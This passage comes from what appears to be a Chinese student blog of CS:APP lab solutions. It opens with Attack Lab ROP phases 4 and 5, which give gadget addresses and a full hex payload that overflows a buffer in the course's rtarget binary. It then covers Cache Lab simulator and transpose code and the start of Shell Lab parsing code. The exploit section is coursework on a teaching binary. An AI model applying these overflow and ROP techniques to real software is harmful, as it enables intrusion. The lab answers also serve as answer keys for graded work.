所以将输入的字符串存到getbuf返回地址的上方test代码段里, 与攻击代码距离40+8(返回地址)字节, 将该地址mov到%rdi里. 由于一次性使用程序, 不用关心test里的数据被改变</p></li></ol><h3 id="ROP-phase-4"><a href="#ROP-phase-4" class="headerlink" title="ROP: phase 4"></a>ROP: phase 4</h3><p>这一节实际上重复了phase2的任务, 但是使用了栈随机化和限制代码可执行区域, 所以采用ROP进行攻击.</p><p>使用objdump -s rtarget &gt; rtarget.s得到反汇编代码, 可以从handout中得知所需的gadget在以start_farm函数开始, 以mid_farm结束的一些函数中</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401994 &lt;start_farm&gt;:<br>  401994:b8 01 00 00 00       mov    $0x1,%eax<br>  401999:c3                   retq  <br></code></pre></div></td></tr></table></figure><p>由于找不到直接pop %rdi的代码, 所以转向pop到其他寄存器然后mov到%rdi中, 这时候可以发现addval_219和addval_273中的58 90 c3, 48 89 c7 c3, 即pop %rax, mov %rax, %rdi(真tm就是直接找啊).</p><p>然后在buf里填充40字节空字符, 溢出的8字节定位到219, 从栈上pop出cookie, ret(0xc3)指令从栈上弹出一个地址即273的地址, 执行完mov后再ret, 最终跳转到touch2.</p><img src="../../image/CSAPP_Lab/0.png" style="zoom:60%;" /><p>exploit code:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 ==&gt;40字节<br>ab 19 40 00 00 00 00 00<br>fa 97 b9 59 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>ec 17 40 00 00 00 00 00<br></code></pre></div></td></tr></table></figure><p>结束.</p><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><blockquote><p>Official Warning : If you have other pressing obligations consider stopping right now.</p><p>重复了phase3的任务.Figure 3D就和nop一样, 不改变任何东西, 可以无视.</p></blockquote><p>由于使用了栈随机化, 又需要把cookie的地址放到栈上产生地址, 再存到%rdi中, 所以需要使用一些代码组合来产生一个固定偏移量的栈地址.<strong>有两种方法:</strong> </p><ol><li><p>使用handout里面给出的那些编码, 代码较长所以才说费时间</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">;in addval_190<br>movq %rsp,%rax<br>ret<br>;in addval_426<br>movq %rax,%rdi<br>ret<br>;in addval_219<br>popq %rax<br>ret<br>;in getval_481<br>movl %eax,%edx<br>ret<br>;in getval_159<br>movl %edx,%ecx<br>ret<br>;in addval_436<br>movl %ecx,%rsi<br>ret<br>;in add_xy<br>lea (%rdi,%rsi,1),%rax<br>retq <br>;in addval_426<br>movq %rax,%rdi<br>ret<br></code></pre></div></td></tr></table></figure><p>%rsp+80处放字符串，%rsp+8处才开始执行addval_190. 所以 <strong>(%rsp+80)-(%rsp+8)=72=0x48</strong></p></li><li><p>使用add指令的编码, 使得实际只需三行汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401a03 &lt;addval_190&gt;:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3                    retq<br>00000000004019d6 &lt;add_xy&gt;:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq<br>00000000004019a0 &lt;addval_273&gt;:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3                    retq<br></code></pre></div></td></tr></table></figure><p>提取后:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">401a06: 48 89 e0              movq %rsp, %rax<br>401a09: c3                    retq<br><br>4019d8: 04 37                 add 0x37, %al<br>4019da: c3                    retq<br><br>4019a2: 48 89 c7              movq %rax, %rdi<br>4019a5: c3                    retq<br></code></pre></div></td></tr></table></figure><p>结束.</p></li></ol><h2 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h2><h3 id="1-Part-A"><a href="#1-Part-A" class="headerlink" title="1)Part A"></a>1)Part A</h3><p>就，没什么可说的，白嫖真香。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">mem_addr_t</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>&#123;</span><br>    <span class="hljs-keyword">mem_addr_t</span> tag;<br>    <span class="hljs-keyword">int</span> valid;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> lru; <br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>* <span class="hljs-title">cache_set_t</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">cache_set_t</span>* <span class="hljs-keyword">cache_t</span>;<br><br><span class="hljs-keyword">cache_t</span> cache;<br><span class="hljs-keyword">mem_addr_t</span> set_index_mask = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accessData</span><span class="hljs-params">(<span class="hljs-keyword">mem_addr_t</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> eviction_line;<br>  <span class="hljs-comment">// 注意是无符号整数</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> eviction_lru = <span class="hljs-number">-1</span>;<br>  eviction_line = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">mem_addr_t</span> tag = addr &gt;&gt; (s + b);<br>  <span class="hljs-keyword">cache_set_t</span> cache_set = cache[(addr &gt;&gt; b) &amp; set_index_mask];<br><br>  <span class="hljs-comment">// 所需数据的cache_line编号</span><br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-comment">// 如果把所有的cache_line全遍历完了还找不到所需的数据</span><br>    <span class="hljs-keyword">if</span> ( i &gt;= E )<br>    &#123;<br>      <span class="hljs-comment">// 数据未命中</span><br>      ++miss_count;<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;miss &quot;</span>);<br>      <span class="hljs-comment">// 在一组cache_line中查找将被删除的cache_line</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> ia = <span class="hljs-number">0</span>; ia &lt; E; ++ia )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( cache_set[ia].lru &lt; eviction_lru )<br>        &#123;<br>          eviction_line = ia;<br>          eviction_lru = cache_set[ia].lru;<br>        &#125;<br>     &#125;<br>      <span class="hljs-comment">// 如果当前这个要被删除的cache_line是valid</span><br>      <span class="hljs-comment">// 即，这个要被替换数据的cache_line是一条之前读入的数据而不是空行</span><br>      <span class="hljs-keyword">if</span> ( cache_set[eviction_line].valid )<br>      &#123;<br>        <span class="hljs-comment">// 删除数+1</span><br>        ++eviction_count;<br>        <span class="hljs-keyword">if</span> ( verbosity )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eviction &quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// 模拟从**主存**读入并覆盖数据到这个刚刚被删除（或本来是空行）的cache_line里</span><br>      cache_set[eviction_line].valid = <span class="hljs-number">1</span>;<br>      cache_set[eviction_line].tag = tag;<br>      cache_set[eviction_line].lru = lru_counter++;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 查找cache中的数据</span><br>    <span class="hljs-keyword">if</span> ( cache_set[i].tag == tag &amp;&amp; cache_set[i].valid )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-comment">// 如果找到数据了，自然就hit_count++</span><br>  ++hit_count;<br>  <span class="hljs-keyword">if</span> ( verbosity )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hit &quot;</span>);<br>  cache_set[i].lru = lru_counter++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">replayTrace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *trace_fn)</span></span><br><span class="hljs-function"></span>&#123;<br>  FILE * trace_fp = fopen(trace_fn, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !trace_fp )<br>  &#123;<br>    <span class="hljs-keyword">int</span>* err_num = __errno_location();<br>    <span class="hljs-keyword">char</span>* err_str = strerror(*err_num);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, trace_fn, err_str);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1000</span>];<br>  <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-number">1000</span>, trace_fp) )<br>  &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">mem_addr_t</span> addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;S&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;L&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>    &#123;<br>      <span class="hljs-built_in">sscanf</span>(&amp;buf[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;%llx,%u&quot;</span>, &amp;addr, &amp;len);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %llx,%u &quot;</span>, buf[<span class="hljs-number">1</span>], addr, len);<br>      <span class="hljs-comment">// 读取/写入数据</span><br>      <span class="hljs-comment">// 写入数据同样需要判断数据是否存在与cache。如果数据不在，同样要将其读回cache</span><br>      accessData(addr);<br>      <span class="hljs-comment">// 如果当前指令是修改指令，则上一条accessData读取数据，下一条的accessData写入数据</span><br>      <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>        accessData(addr);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>  &#125;<br>  fclose(trace_fp);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-Part-B"><a href="#2-Part-B" class="headerlink" title="2)Part B"></a>2)Part B</h3><h4 id="32-32"><a href="#32-32" class="headerlink" title="32*32:"></a>32*32:</h4><p>最优解法是非常暴力非常详细的写出每一行的移动情况，普通解法是规规矩矩的8分块。<a href="https://zhuanlan.zhihu.com/p/79058089">链接</a>_</p><h4 id="64-64"><a href="#64-64" class="headerlink" title="64*64:"></a>64*64:</h4><p>第一种解法是八分块然后再4分块。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (M == <span class="hljs-number">64</span>)<br>&#123;<br><span class="hljs-keyword">int</span> i, j, x, y;<br><span class="hljs-keyword">int</span> x1, x2, x3, x4, x5, x6, x7, x8;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">8</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (x = i; x &lt; i + <span class="hljs-number">4</span>; ++x)<br>&#123;<br>x1 = A[x][j]; x2 = A[x][j+<span class="hljs-number">1</span>]; x3 = A[x][j+<span class="hljs-number">2</span>]; x4 = A[x][j+<span class="hljs-number">3</span>];<br>x5 = A[x][j+<span class="hljs-number">4</span>]; x6 = A[x][j+<span class="hljs-number">5</span>]; x7 = A[x][j+<span class="hljs-number">6</span>]; x8 = A[x][j+<span class="hljs-number">7</span>];<br><br>B[j][x] = x1; B[j+<span class="hljs-number">1</span>][x] = x2; B[j+<span class="hljs-number">2</span>][x] = x3; B[j+<span class="hljs-number">3</span>][x] = x4;<br>B[j][x+<span class="hljs-number">4</span>] = x5; B[j+<span class="hljs-number">1</span>][x+<span class="hljs-number">4</span>] = x6; B[j+<span class="hljs-number">2</span>][x+<span class="hljs-number">4</span>] = x7; B[j+<span class="hljs-number">3</span>][x+<span class="hljs-number">4</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (y = j; y &lt; j + <span class="hljs-number">4</span>; ++y)<br>&#123;<br>x1 = A[i+<span class="hljs-number">4</span>][y]; x2 = A[i+<span class="hljs-number">5</span>][y]; x3 = A[i+<span class="hljs-number">6</span>][y]; x4 = A[i+<span class="hljs-number">7</span>][y];<br>x5 = B[y][i+<span class="hljs-number">4</span>]; x6 = B[y][i+<span class="hljs-number">5</span>]; x7 = B[y][i+<span class="hljs-number">6</span>]; x8 = B[y][i+<span class="hljs-number">7</span>];<br><br>B[y][i+<span class="hljs-number">4</span>] = x1; B[y][i+<span class="hljs-number">5</span>] = x2; B[y][i+<span class="hljs-number">6</span>] = x3; B[y][i+<span class="hljs-number">7</span>] = x4;<br>B[y+<span class="hljs-number">4</span>][i] = x5; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">1</span>] = x6; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">2</span>] = x7; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">3</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (x = i + <span class="hljs-number">4</span>; x &lt; i + <span class="hljs-number">8</span>; ++x)<br>&#123;<br>x1 = A[x][j+<span class="hljs-number">4</span>]; x2 = A[x][j+<span class="hljs-number">5</span>]; x3 = A[x][j+<span class="hljs-number">6</span>]; x4 = A[x][j+<span class="hljs-number">7</span>];<br>B[j+<span class="hljs-number">4</span>][x] = x1; B[j+<span class="hljs-number">5</span>][x] = x2; B[j+<span class="hljs-number">6</span>][x] = x3; B[j+<span class="hljs-number">7</span>][x] = x4;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>第二种解法在那个链接里的评论区里1024次miss, 未看.</p><h4 id="61-67"><a href="#61-67" class="headerlink" title="61*67:"></a>61*67:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">16</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">16</span>)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = i; k &lt; i + <span class="hljs-number">16</span> &amp;&amp; k &lt; N; ++k)<br>        &#123;<br>            <span class="hljs-keyword">int</span> temp_position = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">int</span> temp_value = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">int</span> l;<br>            <span class="hljs-keyword">for</span> (l = j; l &lt; j + <span class="hljs-number">16</span> &amp;&amp; l &lt; M; ++l)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (l == k) <span class="hljs-comment">/* 横坐标等于纵坐标，局部变量暂存，整个block读完再处理 */</span><br>                &#123;<br>                    temp_position = k;<br>                    temp_value = A[k][k];<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    B[l][k] = A[k][l];<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (temp_position != <span class="hljs-number">-1</span>) <span class="hljs-comment">/* 遇到了冲突元素 */</span> <br>            &#123;<br>                B[temp_position][temp_position] = temp_value;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="其他链接"><a href="#其他链接" class="headerlink" title="其他链接"></a>其他链接</h3><p>附上手算miss率的神人<a href="https://zhuanlan.zhihu.com/p/28585726">专栏</a>. 以及CMU的<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">课件</a>, miss次数好像就是这上面的.</p><h2 id="ShellLab"><a href="#ShellLab" class="headerlink" title="ShellLab"></a>ShellLab</h2><h3 id="通过parseline理解一下如何编写"><a href="#通过parseline理解一下如何编写" class="headerlink" title="通过parseline理解一下如何编写"></a>通过parseline理解一下如何编写</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * parseline - Parse the command line and build the argv array.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Characters enclosed in single quotes are treated as a single</span><br><span class="hljs-comment"> * argument.  Return true if the user has requested a BG job, false if</span><br><span class="hljs-comment"> * the user has requested a FG job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span>  <span class="hljs-comment">// cmdline--&gt;argv_array</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> <span class="hljs-built_in">array</span>[MAXLINE]; <span class="hljs-comment">/* holds local copy of command line */</span><br>    <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">array</span>;          <span class="hljs-comment">/* ptr that *traverses* command line */</span><br>    <span class="hljs-keyword">char</span> *delim;                <span class="hljs-comment">/* points to first space delimiter */</span><br>    <span class="hljs-keyword">int</span> argc;                   <span class="hljs-comment">/* number of args */</span><br>    <span class="hljs-keyword">int</span> bg;                     <span class="hljs-comment">/* background job? */</span><br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    buf[<span class="hljs-built_in">strlen</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;  <span class="hljs-comment">/* replace trailing &#x27;\n&#x27; with space */</span><br>    <span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore leading spaces */</span><br>buf++;<br><br>    <span class="hljs-comment">/* Build the argv list */</span> <span class="hljs-comment">//这里已经到了第一个非空字符</span><br>    argc = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>buf++;<br>delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>); <span class="hljs-comment">//这两个delim指明的是当前参数后面的分隔符</span><br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (delim) &#123;<br>argv[argc++] = buf;<br>*delim = <span class="hljs-string">&#x27;\0&#x27;</span>;<span class="hljs-comment">//截断</span><br>buf = delim + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore spaces */</span><br>       buf++;<br><br><span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>    buf++;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br>    &#125;<br>    argv[argc] = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* ignore blank line */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/* should the job run in the background? */</span><br>    <span class="hljs-keyword">if</span> ((bg = (*argv[argc<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;&amp;&#x27;</span>)) != <span class="hljs-number">0</span>) &#123;<br>argv[--argc] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bg;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-eval-处理命令行输入-cmdline"><a href="#1-eval-处理命令行输入-cmdline" class="headerlink" title="1.eval(): 处理命令行输入(cmdline)"></a>1.<code>eval()</code>: 处理命令行输入(cmdline)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span 